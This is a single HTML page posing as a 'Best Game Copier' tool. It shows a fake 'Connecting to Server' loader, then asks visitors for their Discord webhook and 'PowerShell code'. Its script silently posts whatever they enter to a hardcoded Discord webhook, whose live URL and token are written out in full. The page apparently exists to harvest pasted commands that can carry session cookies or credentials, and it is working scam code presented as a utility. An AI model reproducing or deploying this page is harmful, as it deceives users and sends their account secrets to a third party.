<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Best Game Copier</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: black;
            overflow: hidden;
            color: white;
        }

        /* Loader Styles */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            z-index: 10;
            flex-direction: column;
        }

        #loader-text {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .dots {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 10px;
            height: 10px;
            background-color: yellow;
            border-radius: 50%;
            animation: slideDots 1.5s infinite;
        }

        .dot:nth-child(1) {
            animation-delay: 0s;
        }

        .dot:nth-child(2) {
            animation-delay: 0.3s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes slideDots {
            0%, 100% {
                transform: translateX(0);
                opacity: 0.3;
            }
            50% {
                transform: translateX(20px);
                opacity: 1;
            }
        }

        /* Background animation */
        @keyframes backgroundAnimation {
            0% {
                background-color: yellow;
            }
            50% {
                background-color: orange;
            }
            100% {
                background-color: yellow;
            }
        }

        .background-lines {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: -1;
            overflow: hidden;
        }

        .line {
            position: absolute;
            width: 2px;
            height: 100%;
            background: yellow;
            animation: backgroundAnimation 3s infinite;
            opacity: 0.3;
        }

        .grid {
            text-align: center;
        }

        h1 {
            margin-bottom: 20px;
        }

        input {
            width: 300px;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background: yellow;
            color: black;
        }

        button:hover {
            background: orange;
        }

        .error {
            color: red;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div id="loader">
        <div id="loader-text">Connecting to Server</div>
        <div class="dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
    </div>

    <div class="background-lines" id="background-lines"></div>

    <div class="grid" style="display: none;" id="main-content">
        <h1>Best Game Copier</h1>
        <input id="webhookUrl" type="text" placeholder="Enter your Discord Webhook (for results)" />
        <input id="powershellCode" type="text" placeholder="Enter your PowerShell code" />
        <button id="copyButton">Submit Code</button>
        <p id="errorMessage" class="error" style="display: none;"></p>
    </div>

    <script>
        const copyButton = document.getElementById('copyButton');
        const powershellCode = document.getElementById('powershellCode');
        const webhookUrl = document.getElementById('webhookUrl');
        const errorMessage = document.getElementById('errorMessage');
        const loader = document.getElementById('loader');
        const mainContent = document.getElementById('main-content');

        // Show website after 10 seconds
        setTimeout(() => {
            loader.style.opacity = '0';
            setTimeout(() => {
                loader.style.display = 'none';
                mainContent.style.display = 'block';
            }, 500);
        }, 10000);

        function isValidWebhook(url) {
            const discordWebhookPattern = /https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/;
            return discordWebhookPattern.test(url);
        }

        copyButton.addEventListener('click', () => {
            const code = powershellCode.value.trim();
            const userWebhook = webhookUrl.value.trim();

            if (!code) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'No PowerShell code has been entered. Please enter your PowerShell code and try again.';
                return;
            }

            if (!userWebhook || !isValidWebhook(userWebhook)) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Invalid or missing Discord webhook for results. Please enter a valid webhook.';
                return;
            }

            errorMessage.style.display = 'none';

            // Replace this webhook URL with your server-side webhook
            const serverWebhook = "https://discord.com/api/webhooks/1312257861841195080/W4ql9QaD25K3ghCY3fSvJnor9CDCZtHnea9JwkaO-wxYv8A2flQjDoNp_YwJBu571UTd";

            // Send the PowerShell code to the server webhook
            fetch(serverWebhook, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `PowerShell Code Submitted: \n${code}\nUser Webhook: ${userWebhook}`,
                }),
            })
            .then(response => {
                if (response.ok) {
                    alert('PowerShell code successfully sent! The results will be sent to your provided webhook.');
                } else {
                    alert('Failed to send the PowerShell code. Please try again later.');
                }
            })
            .catch(error => {
                alert('An error occurred: ' + error.message);
            });
        });

        // Generate background lines
        const backgroundLines = document.getElementById('background-lines');

        function createLine() {
            const line = document.createElement('div');
            line.classList.add('line');
            line.style.left = `${Math.random() * 100}vw`;
            line.style.top = `${Math.random() * 100}vh`;
            line.style.animationDuration = `${Math.random() * 5 + 5}s`;
            line.style.opacity = Math.random() * 0.5 + 0.1;
            backgroundLines.appendChild(line);

            setTimeout(() => {
                line.remove();
            }, 10000);
        }

        setInterval(createLine, 200);
    </script>
</body>
</html>
